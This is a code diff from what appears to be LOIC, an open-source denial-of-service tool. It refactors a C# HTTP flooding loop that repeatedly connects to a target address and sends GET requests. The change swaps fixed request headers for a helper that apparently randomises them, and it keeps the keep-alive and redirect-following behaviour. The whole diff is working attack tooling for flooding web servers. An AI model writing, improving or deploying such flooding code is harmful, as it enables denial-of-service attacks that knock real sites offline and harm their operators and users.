@@ -174,16 +174,14 @@ namespace LOIC
 		{
 			try
 			{
-				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
-
 				int bsize = 16;
 				int mincl = 16384; // set minimal content-length to 16KB
-				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 				byte[] rbuf = new byte[bsize];
-				State = ReqState.Ready;
-				var stop = DateTime.UtcNow;
-
 				string redirect = "";
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
+				DateTime stop = DateTime.UtcNow;
+
+				State = ReqState.Ready;
 				while (IsFlooding)
 				{
 					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
@@ -198,10 +196,7 @@ namespace LOIC
 						{
 							socket.Connect(RHost);
 							socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
-							if (_random == true)
-							{
-								sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-							}
+							byte[] sbuf = Functions.RandomHttpHeader("GET", _subSite, _dns, _random, _usegZip, 300);
 							socket.Send(sbuf);
 						}
 						catch { }
@@ -221,7 +216,7 @@ namespace LOIC
 											socket.ReceiveBufferSize = bsize;
 											socket.Connect(RHost);
 										}
-										sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", redirect, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+										byte[] sbuf = Functions.RandomHttpHeader("GET", redirect, _dns, false, _usegZip, 300);
 										socket.Send(sbuf);
 										redirect = "";
 									}
